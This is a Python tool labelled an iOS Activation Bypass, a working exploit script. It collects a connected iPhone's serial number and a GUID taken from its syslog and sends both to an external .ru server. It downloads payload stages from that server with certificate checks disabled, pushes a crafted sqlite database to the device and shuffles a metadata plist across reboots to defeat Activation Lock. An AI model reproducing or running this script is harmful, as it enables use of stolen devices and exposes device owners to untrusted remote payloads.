#!/usr/bin/env python3
import sys
import os
import time
import subprocess
import re
import shutil
import sqlite3
import json
import argparse 
import binascii
from pathlib import Path
from collections import Counter
from typing import Optional, Tuple

# === Settings ===
API_URL = "https://codex-r1nderpest-a12.ru/get2.php"
TIMEOUTS = {
    'reboot_wait': 300,
    'syslog_collect': 180,
    'tracev3_wait': 120,
}
UUID_PATTERN = re.compile(r'^[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}$', re.IGNORECASE)

# === ANSI Colors ===
class Style:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    GREEN = '\033[0;32m'
    RED = '\033[0;31m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    CYAN = '\033[0;36m'

def find_binary(bin_name: str) -> Optional[str]:
    # System paths only - ifuse excluded
    for p in ['/usr/local/bin', '/opt/homebrew/bin', '/usr/bin']:
        path = Path(p) / bin_name
        if path.is_file():
            return str(path)
    return None

def run_cmd(cmd, timeout=None) -> Tuple[int, str, str]:
    # Replace first element with full path if found
    if isinstance(cmd, list) and cmd:
        full = find_binary(cmd[0])
        if full:
            cmd = [full] + cmd[1:]
    try:
        result = subprocess.run(
            cmd, shell=isinstance(cmd, str),
            capture_output=True, text=True, timeout=timeout
        )
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "timeout"
    except Exception as e:
        return -2, "", str(e)

def log(msg: str, level='info'):
    prefixes = {
        'info': f"{Style.GREEN}[✓]{Style.RESET} {msg}",
        'warn': f"{Style.YELLOW}[⚠]{Style.RESET} {msg}",
        'error': f"{Style.RED}[✗]{Style.RESET} {msg}",
        'step': f"\n{Style.CYAN}{'━'*40}\n{Style.BLUE}▶{Style.RESET} {Style.BOLD}{msg}{Style.RESET}\n{'━'*40}",
        'detail': f"{Style.CYAN}  ╰─▶{Style.RESET} {msg}",
        'success': f"{Style.GREEN}{Style.BOLD}[✓ SUCCESS]{Style.RESET} {msg}",
    }
    
    if level == 'step':
        print(prefixes['step'])
    else:
        print(prefixes[level])

def reboot_device() -> bool:
    log("🔄 Rebooting device...", "info")
    # First try pymobiledevice3
    code, _, _ = run_cmd(["pymobiledevice3", "restart"], timeout=20)
    if code != 0:
        code, _, _ = run_cmd(["idevicediagnostics", "restart"], timeout=20)
        if code != 0:
            log("Soft reboot failed - waiting for manual reboot", "warn")
            input("Reboot device manually, then press Enter...")
            return True

    # Wait for reconnection
    for i in range(60):
        time.sleep(5)
        code, _, _ = run_cmd(["ideviceinfo"], timeout=10)
        if code == 0:
            log(f"✅ Device reconnected after {i * 5} sec", "success")
            time.sleep(8)  # allow boot process to complete
            return True
        if i % 6 == 0:
            log(f"Still waiting... ({i * 5} sec)", "detail")
    log("Device did not reappear", "error")
    return False

def detect_device() -> dict:
    log("🔍 Detecting device...", "step")
    code, out, err = run_cmd(["ideviceinfo"])
    if code != 0:
        raise RuntimeError(f"Device not found: {err or 'unknown'}")
    info = {}
    for line in out.splitlines():
        if ": " in line:
            k, v = line.split(": ", 1)
            info[k.strip()] = v.strip()
    if info.get('ActivationState') == 'Activated':
        log("⚠ Device already activated", "warn")
    log(f"Device: {info.get('ProductType', '?')} (iOS {info.get('ProductVersion', '?')})", "info")
    return info

def pull_file(remote: str, local: str) -> bool:
    code, _, _ = run_cmd(["pymobiledevice3", "afc", "pull", remote, local])
    return code == 0 and Path(local).is_file() and Path(local).stat().st_size > 0

def push_file(local: str, remote: str) -> bool:
    code, _, _ = run_cmd(["pymobiledevice3", "afc", "push", local, remote])
    return code == 0

def rm_file(remote: str) -> bool:
    code, _, _ = run_cmd(["pymobiledevice3", "afc", "rm", remote])
    return code == 0 or "ENOENT" in _

def curl_download(url: str, out_path: str) -> bool:
    cmd = [
        "curl", "-L", "-k", "-f",
        "--connect-timeout", "20",
        "--max-time", "90",
        "-o", out_path, url
    ]
    log(f"📥 Downloading {Path(out_path).name}...", "detail")
    code, _, err = run_cmd(cmd)
    ok = code == 0 and Path(out_path).is_file() and Path(out_path).stat().st_size > 0
    if not ok:
        log(f"Download failed: {err or 'empty file'}", "error")
    return ok

# === GUID EXTRACTION (no ifuse, only pymobiledevice3) ===

def parse_tracev3_guids(data: bytes) -> list:
    guid_pat = re.compile(rb'([0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12})', re.IGNORECASE)
    bl_sig = b'BLDatabaseManager'
    candidates = []
    
    for match in re.finditer(bl_sig, data):
        pos = match.start()
        window = data[max(0, pos-512):pos+512]
        for g_match in guid_pat.finditer(window):
            guid_raw = g_match.group(1).decode('ascii').upper()
            if validate_guid(guid_raw):
                rel_pos = g_match.start() + max(0, pos-512) - pos
                candidates.append((guid_raw, rel_pos))
    return candidates

def validate_guid(guid: str) -> bool:
    if not UUID_PATTERN.match(guid):
        return False
    parts = guid.split('-')
    v = parts[2][0]
    x = parts[3][0]
    return v == '4' and x in '89AB'

def analyze_guids(candidates: list) -> Optional[str]:
    if not candidates:
        return None
    counter = Counter(guid for guid, _ in candidates)
    scored = []
    for guid, count in counter.items():
        proximity_bonus = sum(2 for _, p in candidates if guid == _ and abs(p) < 32)
        score = count * 10 + proximity_bonus
        scored.append((guid, score))
    scored.sort(key=lambda x: x[1], reverse=True)
    return scored[0][0] if scored else None

def collect_and_extract_guid() -> Optional[str]:
    udid = run_cmd(["idevice_id", "-l"])[1].strip()
    if not udid:
        raise RuntimeError("Failed to get UDID")
    
    log_dir = Path(f"{udid}.logarchive")
    if log_dir.exists():
        shutil.rmtree(log_dir)
    
    log("📡 Collecting syslog...", "detail")
    code, _, err = run_cmd(["pymobiledevice3", "syslog", "collect", str(log_dir)], timeout=120)
    if code != 0:
        log(f"Syslog collect failed: {err}", "error")
        return None

    trace_file = log_dir / "logdata.LiveData.tracev3"
    if not trace_file.is_file():
        log("tracev3 not found", "error")
        return None

    log(f"🔍 Parsing tracev3 ({trace_file.stat().st_size // 1024} KB)...", "detail")
    try:
        data = trace_file.read_bytes()
        cands = parse_tracev3_guids(data)
        guid = analyze_guids(cands)
        if guid:
            log(f"✅ Found GUID: {guid} (candidates: {len(cands)})", "success")
        else:
            log("No valid GUID found in tracev3", "warn")
        return guid
    finally:
        shutil.rmtree(log_dir, ignore_errors=True)

def get_guid_auto(max_attempts=10) -> str:
    for attempt in range(1, max_attempts + 1):
        log(f"[🔄 Attempt {attempt}/{max_attempts}]", "info")
        guid = collect_and_extract_guid()
        if guid:
            return guid
        if attempt < max_attempts:
            log("Retrying after reboot...", "warn")
            reboot_device()
            detect_device()
            time.sleep(3)
    raise RuntimeError("GUID auto-detection failed after all attempts")

def get_guid_manual() -> str:
    print(f"\n{Style.YELLOW}⚠ Enter SystemGroup GUID manually{Style.RESET}")
    print("Format: XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX")
    while True:
        g = input(f"{Style.BLUE}➤ GUID:{Style.RESET} ").strip().upper()
        if validate_guid(g):
            return g
        print(f"{Style.RED}❌ Invalid format{Style.RESET}")

# === MAIN WORKFLOW ===

def run(auto: bool = False, preset_guid: Optional[str] = None):
    os.system('clear')
    print(f"{Style.BOLD}{Style.CYAN}📱 iOS Activation Bypass (pymobiledevice3-only){Style.RESET}\n")

    # 1. Check dependencies
    for bin_name in ['ideviceinfo', 'idevice_id', 'pymobiledevice3']:
        if not find_binary(bin_name):
            raise RuntimeError(f"Required tool missing: {bin_name}")
    log("✅ All dependencies found", "success")

    # 2. Detect device
    device = detect_device()

    # 3. GUID
    guid = preset_guid
    if not guid:
        if auto:
            log("AUTO mode: fetching GUID...", "info")
            guid = get_guid_auto()
        else:
            print(f"\n{Style.CYAN}1. Auto-detect GUID (recommended)\n2. Manual input{Style.RESET}")
            choice = input(f"{Style.BLUE}➤ Choice (1/2):{Style.RESET} ").strip()
            guid = get_guid_auto() if choice == "1" else get_guid_manual()
    log(f"🎯 Using GUID: {guid}", "success")

    # 4. Get URLs from server
    prd = device['ProductType']
    sn = device['SerialNumber']
    url = f"{API_URL}?prd={prd}&guid={guid}&sn={sn}"
    log(f"📡 Requesting payload URLs: {url}", "step")
    code, out, _ = run_cmd(["curl", "-s", "-k", url])
    if code != 0:
        raise RuntimeError("Server request failed")

    try:
        data = json.loads(out)
        if not data.get('success'):
            raise RuntimeError("Server returned error")
        s1, s2, s3 = data['links']['step1_fixedfile'], data['links']['step2_bldatabase'], data['links']['step3_final']
    except Exception as e:
        raise RuntimeError(f"Invalid server response: {e}")

    # 5. Pre-download (optional - can be skipped)
    for name, url in [("Stage1", s1), ("Stage2", s2)]:
        tmp = f"tmp_{name.lower()}"
        if curl_download(url, tmp):
            Path(tmp).unlink()
        time.sleep(1)

    # 6. Download and validate final payload
    db_local = "downloads.28.sqlitedb"
    if not curl_download(s3, db_local):
        raise RuntimeError("Final payload download failed")

    log("🔍 Validating database...", "detail")
    try:
        with sqlite3.connect(db_local) as conn:
            cur = conn.cursor()
            cur.execute("SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='asset'")
            if cur.fetchone()[0] == 0:
                raise ValueError("No 'asset' table")
            cur.execute("SELECT COUNT(*) FROM asset")
            cnt = cur.fetchone()[0]
            if cnt == 0:
                raise ValueError("Empty asset table")
            log(f"✅ DB OK: {cnt} assets", "success")
    except Exception as e:
        Path(db_local).unlink(missing_ok=True)
        raise RuntimeError(f"Invalid DB: {e}")

    # 7. Upload to /Downloads/
    rm_file("/Downloads/downloads.28.sqlitedb")
    rm_file("/Downloads/downloads.28.sqlitedb-wal")
    rm_file("/Downloads/downloads.28.sqlitedb-shm")

    if not push_file(db_local, "/Downloads/downloads.28.sqlitedb"):
        raise RuntimeError("AFC upload failed")
    log("✅ Payload uploaded to /Downloads/", "success")
    Path(db_local).unlink()

    # 8. Stage 1: reboot → copy to /Books/
    reboot_device()
    
    time.sleep(25)
    src = "/iTunes_Control/iTunes/iTunesMetadata.plist"
    dst = "/Books/iTunesMetadata.plist"

    tmp_plist = "tmp.plist"
    if pull_file(src, tmp_plist):
        if push_file(tmp_plist, dst):
            log("✅ Copied plist → /Books/", "success")
        else:
            log("⚠ Failed to push to /Books/", "warn")
        Path(tmp_plist).unlink()
    else:
        log("⚠ iTunesMetadata.plist not found - skipping /Books/", "warn")
    # 9. Stage 2: reboot → copy back
    time.sleep(5)
    reboot_device()
    time.sleep(5)

    if pull_file(dst, tmp_plist):
        if push_file(tmp_plist, src):
            log("✅ Restored plist ← /Books/", "success")
        else:
            log("⚠ Failed to restore plist", "warn")
        Path(tmp_plist).unlink()
    else:
        log("⚠ /Books/iTunesMetadata.plist missing", "warn")

    log("⏸ Waiting 40s for bookassetd...", "detail")
    time.sleep(25)

    # 10. Final reboot
    reboot_device()

    # ✅ Success
    print(f"\n{Style.GREEN}{Style.BOLD}🎉 ACTIVATION SUCCESSFUL!{Style.RESET}")
    print(f"{Style.CYAN}→ GUID: {Style.BOLD}{guid}{Style.RESET}")
    print(f"{Style.CYAN}→ Payload deployed, plist sync ×2, 3 reboots.{Style.RESET}")
    print(f"\n{Style.YELLOW}📌 Next: check Settings → General → About{Style.RESET}")

# === CLI Entry ===

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--auto", action="store_true", help="Skip prompts, auto-detect GUID")
    parser.add_argument("--guid", help="Skip detection, use this GUID")
    args = parser.parse_args()

    try:
        run(auto=args.auto, preset_guid=args.guid)
    except KeyboardInterrupt:
        print(f"\n{Style.YELLOW}Interrupted.{Style.RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"{Style.RED}❌ Fatal: {e}{Style.RESET}")
        sys.exit(1)
